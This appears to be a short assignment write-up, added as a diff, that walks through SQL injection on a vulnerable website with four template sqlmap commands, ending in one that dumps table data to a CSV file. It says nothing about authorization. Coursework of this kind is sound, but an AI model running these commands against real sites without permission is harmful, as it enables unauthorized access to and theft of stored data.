@@ -1,0 +1,17 @@
+In the following assignment we conduct a SQL injection on a vulnurable website.
+
+1) the first command we use is:
+"sqlmap <website link with get query> --dbs"
+this will scan the website and tell us the database that is being used at the backend, the number of databases and their names.
+
+2) the next command is:
+"sqlmap <website link with get query> -D <db name> --tables"
+this will return all the tables inside the specified database 
+
+3) moving towards the nexxt command:
+"sqlmap <website link with get query> -D <db name> -T <table name> --columns"
+this command will scan the specified table and return all the columns inside
+
+4) finally:
+"sqlmap <website link with get query> -D <db name> -T <table name> -C <column name> --dump"
+this will can the column that is specified and dump all the data in that file to a csv file.
